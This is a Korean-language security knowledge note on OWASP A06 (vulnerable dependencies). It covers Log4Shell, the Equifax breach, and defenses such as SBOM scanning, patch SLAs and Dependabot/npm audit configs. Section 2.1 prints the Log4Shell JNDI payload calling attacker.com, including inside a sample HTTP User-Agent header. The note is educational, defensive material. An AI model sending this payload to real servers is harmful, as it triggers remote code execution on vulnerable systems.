---
title: "Vulnerable & Outdated Components (OWASP A06) — 취약 의존성"
kind: knowledge
project: security
agent: security-review
status: current
created_at: 2026-06-15
tags: [security, web-security, dependencies, supply-chain, cve, owasp]
home_hub: "20-areas/security/web-security"
related: ["[[web-security]]", "[[injection]]", "[[../../devops/security-ops/supply-chain-security|supply-chain-security]]"]
---

# Vulnerable & Outdated Components (OWASP A06) — 취약 의존성

| 문서 버전 | 작성일 | 작성자 | 주요 변경 사항 |
| --- | --- | --- | --- |
| v.1.0.0 | 2026-06-15 | security-review | 최초 — Log4Shell/Equifax + 의존성 관리 |

**[[web-security|↑ web-security]]**

> OWASP A06. 내가 짠 코드가 아니라 "가져다 쓴 라이브러리"의 취약점. 현대 앱 코드의 대부분은 의존성이다.

## 1. 원리 — 내 코드가 멀쩡해도 터진다

현대 웹앱은 직접 의존성(`package.json`/`pom.xml`에 내가 적은 것) 수십 개와, 그 의존성이 또 끌어오는 **전이(transitive) 의존성** 수백~수천 개로 이뤄진다. 평범한 React 앱 하나가 `node_modules`에 1,000개 넘는 패키지를 까는 것은 예외가 아니라 기본값이다. 빌드된 산출물에서 **내가 직접 작성한 코드는 전체의 1~5%** 에 불과하고, 나머지는 전부 남이 짠 코드다.

이 구조의 보안적 함의는 단순하다 — 그 수천 개 중 **단 하나**에 알려진 CVE가 있으면, 내 코드가 아무리 깨끗해도 전체 앱이 취약하다. 더 나쁜 건 전이 의존성이라 내가 그게 깔린 줄도 모른다는 점이다. `package.json`에는 없는데 `package-lock.json` 깊숙이 박혀 있다.

공격자 관점에서 이게 왜 매력적인지가 핵심이다. 공격자는 "마스터웨이의 그 앱"을 분석하지 않는다. 대신 **유명 라이브러리의 공개된 CVE 하나**를 들고, 인터넷 전체를 스캔해 그 버전을 쓰는 모든 서버를 대량으로 찾아 동일한 익스플로잇을 쏜다. 표적이 "내 앱"이 아니라 "라이브러리"이므로, 무명 서비스라고 안전할 이유가 전혀 없다. CVE가 공개되는 순간 전 세계 동일 버전 서버가 동시에 사정권에 든다.

## 2. 실제 사례 — 교과서 두 건

### 2.1 Log4Shell — Log4j CVE-2021-44228 (2021-12)

Java 로깅 라이브러리 Log4j2에는 로그 메시지 안의 `${...}` 패턴을 해석하는 lookup 기능이 있었고, 그중 **JNDI lookup**이 문제였다. 로그로 찍히는 문자열에 다음이 들어오면:

```text
${jndi:ldap://attacker.com/x}
```

Log4j2가 이를 해석해 `attacker.com`의 LDAP 서버에 접속하고, 거기서 지정한 **원격 Java 클래스를 다운로드·실행**한다 — 완전한 원격 코드 실행(RCE). CVSS **10.0**(만점).

치명적이었던 이유는 트리거가 너무 쉬웠다는 점이다. 애플리케이션이 사용자 입력을 **로그에 한 줄 찍기만** 해도 터졌다. `User-Agent` 헤더, 검색어, 닉네임 — 어디든 위 문자열을 넣고 그게 로그에 남으면 끝이었다.

```text
GET / HTTP/1.1
Host: victim.com
User-Agent: ${jndi:ldap://attacker.com/x}   ← 서버가 이 헤더를 로깅하면 RCE
```

그리고 Log4j는 거의 모든 Java 백엔드가 **전이 의존성으로** 깔고 있던 사실상의 표준 로깅 라이브러리였다. "전이 의존성으로 깔린 로깅 라이브러리 하나가 인터넷 전체를 흔든" 사건으로, 전 세계가 연말 휴가를 반납하고 비상 패치에 들어갔다. 내 코드에 `log.info(userInput)` 한 줄만 있어도 취약했다는 점이 A06의 본질을 정확히 보여준다.

### 2.2 Equifax 2017 — 패치가 있었는데 안 올림

미국 신용평가사 Equifax 유출은 "취약점을 몰라서"가 아니라 **"알고도 안 올려서"** 터진 사례다.

- 2017-03 Apache **Struts2 CVE-2017-5638**(원격 코드 실행) 패치 공개.
- Equifax는 이 컴포넌트를 쓰고 있었으나 **약 두 달간 패치를 적용하지 않음**.
- 그 사이 공격자가 미패치 Struts2를 통해 침투, **약 1억 4,700만 명**의 개인정보(주민번호 격인 SSN 포함) 유출.

패치는 존재했고, 다운로드만 하면 됐다. 무너진 것은 코드가 아니라 **운영 프로세스** — "패치 공개됨"과 "프로덕션 반영됨" 사이를 책임지고 닫는 절차가 없었다. A06이 단순 코딩 결함이 아니라 **자산 관리·패치 관리의 문제**임을 보여주는 교과서다.

## 3. 위험 유형

| 유형 | 설명 |
| --- | --- |
| 알려진 CVE 방치 | Equifax처럼 패치가 있는데 미적용. A06에서 가장 흔하고 가장 비싼 실패. |
| EOL / 구버전 | 더 이상 보안 패치가 나오지 않는 버전(예: Node 14, Python 2). CVE가 떠도 고칠 패치 자체가 없음. |
| 전이 의존성 미파악 | 직접 의존성만 보고 안심. 실제 CVE는 lockfile 깊은 곳의 전이 의존성에 있음. |
| 무결성 미검증 | 가져온 패키지가 진짜 그 패키지인지 확인 안 함 — typosquatting(`reqeusts`), 악성 업데이트. 공급망 영역. |

> 공급망(typosquatting / 악성 패키지 / 빌드 파이프라인 변조) 자체의 깊은 위협 모델과 방어는 [[../../devops/security-ops/supply-chain-security|supply-chain-security]]에 위임한다. 본 노트는 "이미 들어온 의존성의 알려진 취약점" 관점에 집중한다.

## 4. 방어

### 4.1 (왜 4구조) SBOM + 자동 의존성 스캔

- **① 왜 필요한가** — 무엇을 쓰는지 정확히 알아야 무엇이 취약한지 알 수 있다. 전이 의존성까지 포함한 **SBOM**(Software Bill of Materials)으로 "지금 프로덕션에 깔린 모든 패키지·버전"을 목록화하고, 그 목록을 CVE 데이터베이스와 자동 대조한다(Dependabot / `npm audit` / `pip-audit` / Snyk / OWASP Dependency-Check). Log4Shell 때 가장 먼저 답해야 했던 질문이 "우리 어디에 Log4j가 깔려 있지?"였고, SBOM이 없는 조직은 그 답을 찾는 데만 며칠을 썼다.
- **② 안 하면 무슨 문제** — 새 CVE가 떴을 때 영향 범위를 수작업으로 추적해야 한다. 전이 의존성은 사람 눈으로 못 찾는다. "우리는 안 쓰는 줄 알았다"가 사고 후 단골 변명이 된다.
- **③ 대안** — 수동 의존성 검토, 정기 보안 감사. 그러나 릴리스마다 의존성이 바뀌는 속도를 사람이 못 따라간다. 자동화가 유일하게 지속 가능하다.
- **④ 트레이드오프** — 스캐너는 **노이즈/false positive**가 많다. 실제로는 도달 불가능한 코드 경로의 CVE, dev 의존성만의 취약점까지 빨갛게 띄워 경보 피로를 유발한다. → severity 필터 + reachability 분석 + 무시 목록(justification 필수) 운영으로 신호 대 잡음을 관리한다.

### 4.2 (왜 4구조) 패치 SLA — 심각도별 기한 강제

- **① 왜 필요한가** — Equifax의 교훈은 "스캔이 없어서"가 아니라 "알고도 안 올려서"였다. 따라서 **"알았다"에서 "반영했다"까지의 시간을 제도로 못 박아야** 한다. 예: Critical 7일, High 30일, Medium 90일 이내 패치. 기한 초과 시 자동 에스컬레이션·릴리스 차단.
- **② 안 하면 무슨 문제** — 패치는 늘 "다음 스프린트"로 밀린다. 보안 부채가 무한히 누적되고, 공개 CVE는 공격자에게 정확한 공략법을 알려주므로 시간이 갈수록 위험이 커진다.
- **③ 대안** — 개발자 재량에 맡기기. 그러나 재량은 항상 기능 개발에 밀린다. SLA가 없으면 "급하지 않은 일"로 분류돼 영원히 미뤄진다.
- **④ 트레이드오프** — 잦은 강제 업그레이드는 **회귀 리스크**와 긴급 배포 부담을 만든다(메이저 버전 업이 API를 깨는 경우). → **스테이징·카나리 배포**와 자동 회귀 테스트로 상쇄하고, 패치 SLA와 릴리스 안정성을 양립시킨다.

### 4.3 보조 방어

- **의존성 최소화** — 안 쓰는 패키지는 깔지 않는다. 가장 안전한 의존성은 없는 의존성이다.
- **버전 핀 + lockfile + 무결성 해시** — `package-lock.json` / `poetry.lock`로 버전 고정, integrity 해시로 변조 탐지.
- **EOL 추적** — endoflife.date 등으로 런타임·프레임워크의 지원 종료일을 미리 관리.
- **런타임 가상 패치(WAF)** — Log4Shell처럼 즉시 패치가 어려울 때 WAF 규칙으로 `${jndi:` 패턴을 차단하는 임시방편. 진짜 패치를 미루는 핑계가 되면 안 된다.

## 5. 실제 명령 / 설정

```bash
# Node — 의존성 취약점 스캔 (전이 포함)
npm audit                      # 전체 트리 스캔
npm audit --audit-level=high   # high 이상만 (CI 게이트용)
npm audit fix                  # 호환 범위 내 자동 패치

# Python
pip-audit                      # 설치된 패키지 CVE 대조
pip-audit -r requirements.txt

# Java / Maven — OWASP Dependency-Check 플러그인
mvn org.owasp:dependency-check-maven:check
# 빌드 실패 기준(CVSS) 설정 예: <failBuildOnCVSS>7</failBuildOnCVSS>
```

```yaml
# .github/dependabot.yml — 자동 의존성 PR
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
  - package-ecosystem: "github-actions"   # 워크플로 액션도 의존성이다
    directory: "/"
    schedule:
      interval: "weekly"
```

```yaml
# CI 게이트 — high 이상 취약점 있으면 빌드 실패 (패치 SLA 강제의 기술적 받침)
- name: dependency audit
  run: npm audit --audit-level=high
```

## 6. 관련 노트

- [[../../devops/security-ops/supply-chain-security|supply-chain-security]] — 공급망 위협(typosquatting/악성 패키지/빌드 변조) 깊이
- [[../../devops/security-ops/vulnerability-management|vulnerability-management]] — 스캔→트리아지→패치 SLA 운영 프로세스
- [[injection]] — 데이터/코드 경계 붕괴(별개 뿌리지만 RCE로 수렴하는 결과 유사)
- [[security-misconfiguration]] — 구버전 컴포넌트 + 기본 설정 방치는 종종 함께 온다
- [[../security|↑ security]]
